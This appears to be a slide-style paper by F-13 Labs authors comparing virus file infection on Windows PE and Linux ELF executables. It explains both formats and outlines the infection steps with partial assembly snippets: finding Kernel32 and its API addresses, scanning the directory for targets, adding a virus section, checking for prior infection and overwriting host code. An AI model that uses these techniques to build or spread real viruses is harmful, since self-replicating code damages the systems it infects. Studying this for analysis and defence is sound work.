# Comparison of File Infection on Windows and Linux

**Authors:**
- lclee_vx / F-13 Labs
- lychan25 / F-13 Labs
- [www.f13-labs.net]

---

## Table of Contents
1. Overview
2. Introduction
3. What is Win32 and ELF32?
4. The PE File Format and ELF File Format
5. Win32 File Infection (Windows Platform) and ELF File Infection (Linux Platform)
6. Demonstration
7. Conclusions
8. References

---

## 1. Overview
- **Introduction**
- **What is Win32 and ELF32?**
- **The PE File Format and ELF File Format**
- **Win32 File Infection (Windows Platform) and ELF File Infection (Linux Platform)**
- **Demonstration**
- **Conclusions**
- **References**

---

## 2. Introduction
- A virus is a program that reproduces its own code by attaching itself to other executable files in such a way that the virus code is executed when the infected executable file is run. [Definition from Computer Knowledge Virus Tutorial, @Computer Knowledge 2000]
- This section will introduce the common file infection strategies that virus writers have used over the years on the Windows and Linux platforms.

---

## 3. What is Win32 and ELF32?
- **Win32**: Refers to the Application Programming Interface (API) available in the Windows Operating System.
- **ELF32**: Standard for a portable object file format that works on 32-bit Intel Architecture environments.

---

## 4. The PE File Format and ELF File Format
### Portable Executable (PE) File Format
- Microsoft’s format for 32-bit executables and object files (DLLs).
- Compatible across 32-bit Windows operating systems.

### Executable and Linking Format (ELF)
- Part of the Application Binary Interface (ABI).
- Streamlines software development.
- Three main types of ELF object files: Relocatable, Executable, and Shared.
- Two views: Executable and Linking.

### PE File Layout
[Detailed layout of the PE file structure]

### ELF File Layout
- **Linking View**
- **Execution View**

---

## 5. Win32 File Infection (Windows Platform) and ELF File Infection (Linux Platform)

### Demonstration
#### PE File Infection
1. **Get the delta offset**
   ```assembly
   VirusStart:
   call Delta
   Delta:
   pop ebp
   mov ebx, ebp ;ebx=ebp
   sub ebp, offset Delta
   ```

2. **Get the Kernel32.dll address**
   ```assembly
   GetK32 proc
   push eax
   Step1:
   dec esi
   mov ax, [esi+3ch]
   test ax, 0f000h
   jnz Step1
   cmp esi, [esi+eax+34h]
   jnz Step1
   pop eax
   ret
   GetK32 endp
   ```

3. **Scan Kernel32.dll and get the address of other API functions**
   - Scan `KERNEL32.DLL` and retrieve the address of other API functions using checksums.
   - Formula:
     1. `eax = Index into the address of Ordinals`
     2. `Ordinal = eax * 2 + [AddressOfNameOrdinals]`
     3. `Address of Functions (RVA) = Ordinal * 4 + [AddressOfFunctions]`

4. **Scan the target file in the current directory**
   ```assembly
   DirectoryScan proc
   lea eax, [ebp+offset CurtDirectory]
   push eax
   push max_path
   mov eax, dword ptr [ebp+offset aGetCurrentDirectoryA]
   call eax
   lea eax, [ebp+offset CurtDirectory]
   push eax
   mov eax, dword ptr [ebp+offset aSetCurrentDirectoryA]
   call eax
   mov dword ptr [ebp+offset Counter], 3
   call SearchFiles
   ret
   DirectoryScan endp
   ```

5. **File Injection with adding a new section**
   - Get the File Attributes and File Handle of the target file.
   - Allocate the specified bytes in the heap.
   - Read the target file and mark the infected file with “chan” in `[PE Header+4ch]`.
   - Add a new section named “lych”.
   - Copy the virus body into the new section.

6. **Copy the virus body into the new section**
7. **Exit and return control to the host file**

#### Before PE File Infection
[Details before infection]

#### After PE File Infection
[Details after infection]

#### ELF File Infection
1. **Get the delta offset**
   ```assembly
   _start:
   call Delta
   Delta:
   pop ebp
   sub ebp, Delta
   ```

2. **Control access to a region of memory**
   ```assembly
   mov edx, 07h
   mov ecx, 04000h
   lea ebx, [ebp+_start]
   and ebx, 0FFFFF000h
   call SYS_mprotect
   Note: All Linux system calls can be accessed with int 80h.
   ```

3. **Scan the target file in the current directory**
   1. Check the file type.
      ```assembly
      mov eax, dword [esi]
      cmp eax, 0x464C457F
      jne near UnMap
      ```
   2. Check if the file is already infected.
      ```assembly
      mov eax, dword [ebp+_start]
      cmp dword [esi], eax
      jz near UnMap
      ```

4. **Check the file type and if it is already infected**
5. **Check for enough space for the virus body**
   ```assembly
   mov eax, dword [edi+14h]
   sub eax, ebx
   mov ecx, VxEnd - _start
   cmp eax, ecx
   jb near UnMap
   ```

6. **Overwrite host code with viral code**
   1. Get the value of:
      - `e_ehsize` (elf header size)
      - `eh_entrypoint` (entry point)
      - `eh_ph_count` (ph number)
      - `eh_ph_entrysize` (ph entry size)
   2. Ensure `e_entry < p_addr + p_memsz`.
   3. Write the frame and virus.

7. **Exit and return to the host program**
   1. Unmap the ELF file and return to the host program.
   Note: The size of the ELF file increases.

#### Before ELF File Infection
[Details before infection]

#### After ELF File Infection
[Details after infection]

---

## 6. Conclusions
- The difficulty of a Linux binary virus infecting ELF executables and spreading.
- Propagation in Linux systems is made more difficult by the limited privileges of user accounts.
- It is easier to access and use Linux system calls with `int 80h`.

---

## 7. References
- Szor, Peter. "Attacks on Win32." Virus Bulletin Conference, October 1998, Munich/Germany, pages 57-84.
- Inside Windows: An In-Depth Look into the Win32 Portable Executable File Format: 
  - [MSDN Article](http://msdn.microsoft.com/msdnmag/issues/02/02/PE/default.aspx)
- Microsoft Portable Executable and Common Object File Format Specification:
  - [Microsoft Documentation](http://www.microsoft.com/whdc/system/platform/firmware/PECOFF.mspx)
- Cesare, Silvio. "Unix Viruses," 1999.
- Belcebu, Billy. "Viruses under Linux, Xine – Issue #5," 1999.
- @Computer Knowledge 2000. "Computer Knowledge Virus Tutorial," 2000.
- [F-13 Labs](http://www.f13-labs.net)
- [EOF Project](http://www.eof-project.net)
- Many thanks go to moaphie, izee, skyout, synge, robingood, Invizible, etc.

---

-Thank You –
- PI:EMAIL
- PI:EMAIL